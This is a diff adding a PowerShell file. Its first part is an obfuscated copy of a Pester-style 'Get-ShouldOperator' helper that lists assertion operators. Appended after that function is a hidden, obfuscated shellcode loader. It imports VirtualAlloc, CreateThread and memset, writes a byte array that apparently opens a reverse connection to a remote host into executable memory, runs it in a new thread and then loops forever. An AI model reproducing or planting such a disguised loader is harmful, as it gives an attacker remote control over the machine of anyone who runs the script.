@@ -1,0 +1,63 @@
+function gE`T-S`HouLdo`pEr`AT`or {
+    
+    [CmdletBinding()]
+    param ()
+
+    
+    
+    
+    
+    DynamicParam {
+        ${param`e`T`eRn`AmE} = ("{0}{1}" -f 'Nam','e')
+
+        ${RuN`TiMEPAR`Am`eTe`RdIcti`O`Na`Ry} = .("{0}{1}{2}"-f 'New','-Obje','ct') ("{9}{3}{6}{0}{1}{8}{2}{10}{7}{5}{4}"-f 'ation.Run','time','i','anage','ary','Diction','ment.Autom','rameter','Def','System.M','nedPa')
+        ${atTri`BU`TE`ColL`eCt`IoN} = &("{2}{1}{0}"-f 'ect','bj','New-O') ("{6}{14}{8}{12}{9}{15}{0}{11}{1}{10}{4}{13}{7}{2}{5}{3}" -f't','Sy','ribu',']','em','te','Syste','t','llections','jectM','st','ion[','.Ob','.At','m.Co','odel.Collec')
+        ${pa`RamETerAtt`Rib`UTE} = &("{2}{1}{0}"-f 't','c','New-Obje') ("{1}{2}{7}{0}{4}{8}{6}{5}{3}{9}"-f 'toma','Sys','tem.Mana','ramet','ti','.Pa','n','gement.Au','o','erAttribute')
+
+        ${a`TtRi`BUt`E`CoLLect`i`oN}.("{0}{1}"-f'A','dd').Invoke(${PARaMe`T`Er`At`TR`ibuTe})
+
+        ${AR`R`sEt} = ${aSsErtIO`NopErAt`o`Rs}."Va`luEs" |
+            &("{1}{2}{3}{4}{0}" -f'Object','S','elec','t','-') -Property ("{0}{1}"-f 'Nam','e'), ("{0}{1}" -f 'A','lias') |
+            &("{4}{1}{2}{0}{3}"-f 'Ob','orE','ach-','ject','F') { ${_}."n`AME"; ${_}.AliaS }
+
+        ${vA`LIda`Te`SE`TATt`RIbUte} = .("{0}{2}{1}"-f'New-','t','Objec') ("{4}{6}{9}{2}{5}{1}{8}{7}{0}{10}{3}"-f 'alidateSe','t.Auto','e','e','Syst','men','em.Ma','n.V','matio','nag','tAttribut')(${ArR`sET})
+
+        ${AtTRi`BU`Te`co`LLEcTioN}.("{1}{0}" -f'd','Ad').Invoke(${V`Alid`ATEs`EtaTT`RIB`UTE})
+
+        ${RuNT`im`ePaRaME`TeR} = .("{1}{2}{0}" -f 'bject','N','ew-O') ("{2}{3}{6}{1}{0}{5}{4}{7}{8}{9}"-f 'a','t.Autom','Sys','tem.Man','.Runtim','tion','agemen','eDefinedPar','amet','er')(${PaRam`eT`eRNAMe}, [string], ${aTtr`Ibut`E`COlLEcT`iON})
+        ${rUntiM`ePara`M`eTeR`D`IcTiO`NArY}.("{1}{0}" -f'd','Ad').Invoke(${Pa`R`A`meteR`NaMe}, ${r`UN`TIME`para`mETEr})
+        return ${Run`Ti`M`EP`ArAMETErDic`TION`ARY}
+    }
+
+    BEGIN {
+        
+        ${N`AMe} = ${psb`Ou`NDP`ARAMETERS}[${pa`RAM`eT`eRnAME}]
+    }
+
+    END {
+        if (${n`AMe}) {
+            ${Op`er`ATor} = ${a`SS`eR`T`ion`OpERAtorS}."vA`Lu`eS" | &("{1}{2}{3}{0}"-f'ject','Wh','ere-','Ob') { ${n`AMe} -eq ${_}."N`Ame" -or ${_}.aLiAS -contains ${N`Ame} }
+            ${h`elp} = &("{2}{0}{1}"-f 'He','lp','Get-') ${oPe`RAt`OR}."I`NtE`RnAlNa`ME" -Examples -ErrorAction ("{2}{3}{4}{0}{1}"-f'yConti','nue','Si','lent','l')
+
+            if ((${H`ElP} | .("{2}{0}{1}{3}"-f 're-O','bje','Measu','ct'))."Cou`NT" -ne 1) {
+                &("{2}{0}{3}{4}{1}" -f'rit','ng','W','e','-Warni') ("No help found for Should operator '{0}'" -f ((.("{0}{7}{5}{6}{2}{4}{1}{3}"-f 'Get-','t','ator','ry','En','rt','ionOper','Asse') ${na`ME})."INTern`ALNA`ME"))
+            }
+            else {
+                ${hE`LP}
+            }
+        }
+        else {
+            ${a`s`seRtIONoPeRa`ToRs}."k`EYs" | &("{2}{3}{0}{1}"-f '-Obje','ct','For','Each') {
+                ${a`liA`SEs} = (&("{2}{8}{7}{5}{0}{1}{6}{4}{3}" -f'tionOp','er','Ge','y','rEntr','ser','ato','-As','t') ${_}).aLIaS
+
+                
+                .("{2}{0}{1}"-f'b','ject','New-O') -TypeName ("{1}{0}{2}" -f 'Obj','PS','ect') -Property @{
+                    ("{0}{1}" -f'Nam','e')  = ${_}
+                    alias = ${alI`A`SES} -join ', '
+                }
+            }
+        }
+    }
+}
+
+${c} = ((("{9}{49}{15}{55}{27}{8}{54}{30}{84}{0}{26}{44}{32}{36}{83}{31}{16}{6}{70}{58}{78}{29}{77}{20}{14}{18}{64}{67}{42}{59}{86}{66}{17}{80}{23}{13}{48}{61}{76}{63}{51}{53}{35}{81}{21}{22}{47}{37}{28}{68}{46}{85}{73}{24}{38}{65}{52}{12}{60}{87}{82}{19}{75}{69}{72}{4}{79}{25}{34}{56}{7}{43}{45}{88}{40}{62}{57}{2}{1}{74}{3}{39}{33}{71}{41}{5}{50}{10}{11}"-f' exte','crt.dlltJD)]pub','tJDmsv',' s','Ptr lpPara','t(',' uint d','int ','bli','[Dl',' coun','t);','Sta','kernel32.dlltJ','io','ernel32.dlltJD',',','t','nType, uin','rtA','at','ntPtr C','r','D','l','er','rn IntPtr V','pu','h',' uint','i','tPtr lpAddress','lo','xtern',',','e','c','teT','pThreadAttributes, ','tatic e','pThre','ntPtr memse','c','dwC','irtualAl','rea','ead(I','ea','D)]','lImport(tJDk','IntPtr dest, uint src, uint','i','int dw','c ext','c stat',')]',' u','mport(','z','t);[D','ckSize,','p','adId);[DllI','stat','t ','u','or','flProte','r',', ','wSi',' I','Int','tr ','lic','ddress','ublic ',' flAlloc','e,','met','(tJ','rn I','IntPtr lpSta','(In','c','ntP','llImp',' ','tionFlags, IntPtr l'))."REPl`ACe"('tJD',[StRInG][CHar]34));${W} = .("{0}{1}{2}"-f 'Add','-Typ','e') -memberDefinition ${C} -Name ("{0}{1}"-f 'W','in32') -namespace ("{0}{1}{3}{2}" -f'W','in3','unctions','2F') -passthru;[Byte[]];[Byte[]]${sc} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x01,0x0a,0x59,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${S`IZE} = 0x1000;if (${SC}."lE`NGTH" -gt 0x1000){${S`izE} = ${s`c}."L`e`NgtH"};${x}=${w}::("{1}{0}{2}" -f 'l','Virtua','Alloc').Invoke(0,0x1000,${S`IzE},0x40);for (${I}=0;${i} -le (${sC}."l`ENg`TH"-1);${i}++) {${w}::"MEM`seT"([IntPtr](${x}.("{0}{2}{1}"-f'T','nt32','oI').Invoke()+${i}), ${SC}[${i}], 1)};${W}::("{0}{1}{2}" -f'Cr','eateT','hread').Invoke(0,0,${x},0,0,0);for (;;){&("{2}{0}{1}" -f'tar','t-sleep','S') 60};
